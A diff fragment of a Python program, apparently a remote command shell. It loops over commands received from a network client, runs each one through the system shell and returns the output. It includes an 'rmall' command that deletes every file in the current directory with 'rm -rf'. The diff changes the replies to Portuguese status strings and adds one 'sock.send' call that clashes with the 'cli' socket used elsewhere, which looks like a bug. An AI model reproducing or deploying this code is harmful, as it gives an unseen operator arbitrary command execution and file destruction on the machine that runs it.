@@ -14,16 +14,16 @@ while 1:
             os.chdir('..')
             proc = subprocess.Popen('cd ..', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = proc.stdout.read() + proc.stderr.read()
-            cli.send(output)
+            sock.send('Feito!')
         elif data.decode() == 'rmall':
             for c in listdir():
                 proc = subprocess.Popen(f'rm -rf {c}', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                 output = proc.stdout.read() + proc.stderr.read()
-            cli.send(output)
+            cli.send('Tudo removido!')
         else:
             proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = proc.stdout.read() + proc.stderr.read()
             cli.send(output)
 
-
+cli.close()
             # cli.send(output)
